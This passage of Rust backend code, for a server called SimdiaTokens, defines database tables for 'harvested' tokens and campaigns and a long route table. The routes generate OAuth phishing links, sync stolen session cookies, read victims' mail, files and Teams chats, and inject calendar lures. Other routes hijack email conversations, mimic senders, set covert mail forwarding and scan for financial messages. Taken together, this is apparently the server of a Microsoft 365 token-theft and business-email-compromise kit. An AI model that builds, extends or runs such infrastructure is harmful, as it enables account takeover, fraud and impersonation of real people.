            requested_scopes TEXT,
            device_code TEXT,
            user_code TEXT,
            verification_uri TEXT,
            status TEXT NOT NULL,
            created_at DATETIME NOT NULL,
            expires_at DATETIME NOT NULL,
            token_id TEXT
        )
        "#
    ).execute(pool).await?;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS audit_logs (
            id TEXT PRIMARY KEY,
            timestamp DATETIME NOT NULL,
            action TEXT NOT NULL,
            campaign_id TEXT,
            token_id TEXT,
            user_email TEXT,
            ip_address TEXT,
            user_agent TEXT,
            details TEXT,
            success BOOLEAN NOT NULL
        )
        "#
    ).execute(pool).await?;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS local_folders (
            id TEXT PRIMARY KEY,
            token_id TEXT NOT NULL,
            name TEXT NOT NULL,
            created_at DATETIME NOT NULL
        )
        "#
    ).execute(pool).await?;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS local_filtered_messages (
            id TEXT PRIMARY KEY,
            token_id TEXT NOT NULL,
            message_id TEXT NOT NULL,
            folder_id TEXT NOT NULL,
            subject TEXT,
            sender TEXT,
            sender_email TEXT,
            received_date TEXT,
            body_preview TEXT,
            keywords TEXT,
            created_at DATETIME NOT NULL
        )
        "#
    ).execute(pool).await?;

    sqlx::query(
        r#"
        CREATE TABLE IF NOT EXISTS ai_analyses (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            token_id TEXT NOT NULL,
            token_email TEXT,
            report TEXT NOT NULL,
            created_at DATETIME NOT NULL DEFAULT (datetime('now'))
        )
        "#
    ).execute(pool).await?;

    // Migration: add session tracking columns to tokens table
    let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN session_status TEXT DEFAULT 'active'")
        .execute(pool).await;
    let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN session_active_at DATETIME")
        .execute(pool).await;
    let _ = sqlx::query("ALTER TABLE tokens ADD COLUMN session_killed_at DATETIME")
        .execute(pool).await;

    // Migration: add session tracking columns to harvested table
    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN session_status TEXT DEFAULT 'active'")
        .execute(pool).await;
    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN session_active_at DATETIME")
        .execute(pool).await;
    let _ = sqlx::query("ALTER TABLE harvested ADD COLUMN session_killed_at DATETIME")
        .execute(pool).await;

    Ok(())
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    dotenv().ok();
    let config = AppConfig::from_env();

    let db_path = config.database_url
        .strip_prefix("sqlite:///")
        .or_else(|| config.database_url.strip_prefix("sqlite://"))
        .or_else(|| config.database_url.strip_prefix("sqlite:"))
        .unwrap_or(&config.database_url)
        .to_string();

    if db_path != ":memory:" {
        // Ensure parent directory exists
        if let Some(parent) = std::path::Path::new(&db_path).parent() {
            if !parent.as_os_str().is_empty() {
                std::fs::create_dir_all(parent)
                    .expect("Failed to create database directory");
            }
        }

        // Test that we can actually write to the directory
        let test_file = std::path::Path::new(&db_path)
            .parent()
            .unwrap_or(std::path::Path::new("."))
            .join(".write_test");
        match std::fs::write(&test_file, b"test") {
            Ok(_) => {
                std::fs::remove_file(&test_file).ok();
                println!("Write test passed on directory");
            }
            Err(e) => {
                panic!("Directory is NOT writable: {}. Check Railway volume permissions.", e);
            }
        }
    }

    // Use ?mode=rwc to force SQLite to create the file if it doesn't exist
    let connect_url = if db_path == ":memory:" {
        config.database_url.clone()
    } else {
        format!("sqlite:///{}?mode=rwc", db_path)
    };

    println!("Connecting to: {}", connect_url);

    let pool = SqlitePoolOptions::new()
        .max_connections(5)
        .connect(&connect_url)
        .await
        .expect("Failed to create database pool");

    init_db(&pool).await.expect("Failed to init DB");
    ensure_users_table(&pool).await.expect("Failed to init users table");
    seed_default_admin(&pool).await.expect("Failed to seed admin");
    let http_client = Client::new();
    let vault = Vault::new(config.master_secret.clone());
    let response_key = ResponseCrypto::derive_key(&config.master_secret);
    let app_state = web::Data::new(AppState { pool, config, http_client, vault, response_key });

    let port = std::env::var("PORT").unwrap_or_else(|_| "8080".to_string());
    let port = port.parse::<u16>().unwrap_or(8080);

    println!("SimdiaTokens backend running on http://0.0.0.0:{}", port);
    start_scheduler(app_state.clone());
    HttpServer::new(move || {
        let cors = Cors::default()
            .allow_any_origin()
            .allow_any_method()
            .allow_any_header()
            .expose_headers(vec!["Authorization"])
            .supports_credentials();
        App::new()
            .wrap(cors)
            .wrap(AuditMiddleware)
            .app_data(app_state.clone())
            .app_data(web::JsonConfig::default().limit(50_000_000))
            .route("/", web::get().to(root_status))
            .route("/robots.txt", web::get().to(robots_txt_handler))
            .route("/exchange", web::get().to(exchange_code))
            .route("/auth-success", web::get().to(auth_success_handler))
            .route("/admin", web::get().to(admin_dashboard))
            .route("/inbox_view", web::get().to(inbox_view_html))
            .route("/api/tokens", web::get().to(api_tokens))
            .route("/api/tokens", web::delete().to(api_delete_tokens))
            .route("/api/tokens/health", web::get().to(tokens_health))
            .route("/api/tokens/store", web::post().to(store_token_handler))
            .route("/api/tokens/{id}", web::get().to(api_token_by_id))
            .route("/api/refresh", web::post().to(api_refresh_token_handler))
            .route("/api/inbox", web::get().to(api_inbox))
            .route("/api/recon/run", web::post().to(recon_run_handler))
            .route("/api/recon/{token_id}", web::get().to(recon_get_handler))
            .route("/api/rules", web::get().to(list_rules_handler))
            .route("/api/rules/create", web::post().to(create_rule_handler))
            .route("/api/rules/{id}", web::delete().to(delete_rule_handler))
            .route("/api/rules/{id}", web::put().to(update_rule_handler))
            .route("/api/rules/graph", web::get().to(fetch_graph_rules_handler))
            .route("/api/rules/run", web::post().to(run_local_rules_handler))
            .route("/api/rules/ai-suggest", web::post().to(ai_suggest_rules_handler))
            .route("/api/contacts", web::get().to(list_contacts_handler))
            .route("/api/contacts", web::post().to(create_contact_handler))
            .route("/api/contacts/{id}", web::patch().to(update_contact_handler))
            .route("/api/contacts/{id}", web::delete().to(delete_contact_handler))
            .route("/api/contacts/extract", web::get().to(extract_emails_handler))
            .route("/api/tasks/lists", web::get().to(list_task_lists_handler))
            .route("/api/tasks", web::get().to(list_tasks_handler))
            .route("/api/tasks", web::post().to(create_task_handler))
            .route("/api/tasks/{id}", web::patch().to(update_task_handler))
            .route("/api/tasks/{id}", web::delete().to(delete_task_handler))
            .route("/api/onedrive/items", web::get().to(list_drive_items_handler))
            .route("/api/onedrive/items/{id}", web::get().to(get_drive_item_handler))
            .route("/api/onedrive/items/{id}/download", web::get().to(download_drive_item_handler))
            .route("/api/onedrive/search", web::get().to(search_drive_items_handler))
            .route("/api/office/docs", web::get().to(list_office_docs_handler))
            .route("/api/office/search", web::get().to(search_office_docs_handler))
            .route("/api/office/embed", web::get().to(get_office_embed_url_handler))
            .route("/api/stealth/config", web::get().to(stealth_config_handler))
            .route("/api/calendar/events", web::get().to(list_calendar_events_handler))
            .route("/api/calendar/inject-meeting", web::post().to(inject_meeting_handler))
            .route("/api/calendar/lure", web::post().to(calendar_lure_handler))
            .route("/api/teams", web::get().to(list_teams_handler))
            .route("/api/teams/{id}/channels", web::get().to(list_team_channels_handler))
            .route("/api/teams/share", web::post().to(share_to_teams_handler))
            .route("/api/teams/send-chat", web::post().to(send_chat_message_handler))
            .route("/api/teams/send-channel", web::post().to(send_channel_message_handler))
            .route("/api/tokens/{id}/session/bookmarklet", web::get().to(generate_bookmarklet_token_handler))
            .route("/api/tokens/{id}/session/sync", web::post().to(sync_cookies_handler))
            .route("/api/tokens/{id}/session/test", web::get().to(test_cookie_session_handler))
            .route("/api/tokens/{id}/session/status", web::get().to(get_session_status_handler))
            .route("/api/tokens/{id}/session/kill", web::post().to(kill_session_handler))
            .route("/api/campaigns/generate-link", web::get().to(generate_oauth_link))
            .route("/api/campaigns/deploy-worker", web::post().to(deploy_worker))
            .route("/api/admins/one-click-deploy", web::post().to(one_click_deploy_handler))
            .route("/api/admins/finalize-worker", web::post().to(finalize_worker_handler))
            .route("/api/admin/backup-db", web::get().to(backup_db_handler))
            .route("/api/admin/restore-db", web::post().to(restore_db_handler))
            .route("/api/admin/restore-db-chunk", web::post().to(restore_db_chunk_handler))
            .route("/api/admin/restore-db-finalize", web::post().to(restore_db_finalize_handler))
            .route("/api/intelligence/cross-account/{token_id}", web::get().to(cross_account_intelligence_handler))
            .route("/api/campaigns", web::get().to(list_campaigns_handler))
            .route("/api/campaigns/create", web::post().to(create_campaign_handler))
            .route("/api/campaigns/{id}", web::get().to(get_campaign_handler))
            .route("/api/campaigns/{id}/attach_token", web::post().to(attach_token_handler))
            .route("/api/campaigns/{id}", web::delete().to(delete_campaign_handler))
            .route("/api/analytics/overview", web::get().to(analytics_overview_handler))
            .route("/api/audit/logs", web::get().to(audit_logs_handler))
            .route("/api/audit/summary", web::get().to(audit_summary_handler))
            .route("/api/settings/ai", web::get().to(get_ai_settings_handler))
            .route("/api/settings/ai", web::post().to(save_ai_settings_handler))
            .route("/api/test-decrypt", web::post().to(test_decrypt_handler))
            .route("/api/maintenance/purge-expired", web::post().to(purge_expired_handler))
            .route("/api/auth/register", web::post().to(register_handler))
            .route("/api/auth/login", web::post().to(login_handler))
            .route("/api/auth/me", web::get().to(me_handler))
            .route("/api/auth/change-password", web::post().to(auth::change_password_handler))
            .route("/api/auth/change-username", web::post().to(auth::change_username_handler))
            .route("/api/admins", web::get().to(list_admins_handler))
            .route("/api/admins", web::post().to(create_admin_handler))
            .route("/api/admins/{id}", web::patch().to(update_admin_handler))
            .route("/api/admins/{id}", web::delete().to(delete_admin_handler))
            .route("/api/bec/analyze", web::get().to(bec_analyze_handler))
            .route("/api/inbox/folders", web::get().to(list_folders_handler))
            .route("/api/inbox/folders", web::post().to(create_folder_handler))
            .route("/api/inbox/folders/{folder_id}", web::delete().to(delete_folder_handler))
            .route("/api/inbox/folders/{folder_id}", web::get().to(folder_messages_handler))
            .route("/api/inbox/send", web::post().to(send_mail_handler))
            .route("/api/inbox/messages/{message_id}", web::delete().to(delete_message_handler))
            .route("/api/inbox/messages/{message_id}/move", web::post().to(move_message_handler))
            .route("/api/inbox/messages/{message_id}/read", web::patch().to(mark_read_handler))
            .route("/api/inbox/contacts", web::get().to(fetch_contacts_handler))
            .route("/api/inbox/mx-check", web::post().to(mx_check_handler))
            .route("/api/inbox/local-folders", web::get().to(list_local_folders_handler))
            .route("/api/inbox/local-folders", web::post().to(create_local_folder_handler))
            .route("/api/inbox/local-folders/{folder_id}", web::delete().to(delete_local_folder_handler))
            .route("/api/inbox/local-folders/{folder_id}/messages", web::get().to(list_local_folder_messages_handler))
            .route("/api/inbox/auto-filter", web::post().to(auto_filter_handler))
            .route("/api/inbox/deleted-items/{token_id}", web::get().to(get_deleted_items_handler))
            .route("/api/inbox/deleted-items/{token_id}/purge", web::post().to(purge_deleted_items_handler))
            .route("/api/lure/generate", web::post().to(generate_lure_handler))
            .route("/api/lure/mimic", web::post().to(mimic_email_handler))
            .route("/api/conversation/hijack", web::post().to(hijack_conversation_handler))
            .route("/api/financial/scan", web::post().to(financial_detection_handler))
            // === Advanced Graph API features ===
            .route("/api/mailbox/settings/{token_id}", web::get().to(get_mailbox_settings_handler))
            .route("/api/mailbox/auto-reply/{token_id}", web::post().to(set_auto_reply_handler))
            .route("/api/mailbox/auto-reply/{token_id}/disable", web::post().to(disable_auto_reply_handler))
            .route("/api/mailbox/forwarding/{token_id}", web::post().to(set_mail_forwarding_handler))
            .route("/api/mailbox/forwarding/{token_id}/disable", web::post().to(disable_mail_forwarding_handler))
            .route("/api/directory/users/{token_id}", web::get().to(search_directory_users_handler))
            .route("/api/drafts/{token_id}", web::get().to(get_drafts_handler))
            .route("/api/drafts/{token_id}", web::post().to(create_draft_handler))
            .route("/api/drafts/{token_id}/{message_id}/send", web::post().to(send_draft_handler))
            .route("/api/messages/{token_id}/{message_id}/categories", web::post().to(apply_categories_handler))
    })
    .bind(("0.0.0.0", port))?
    .run()
    .await
}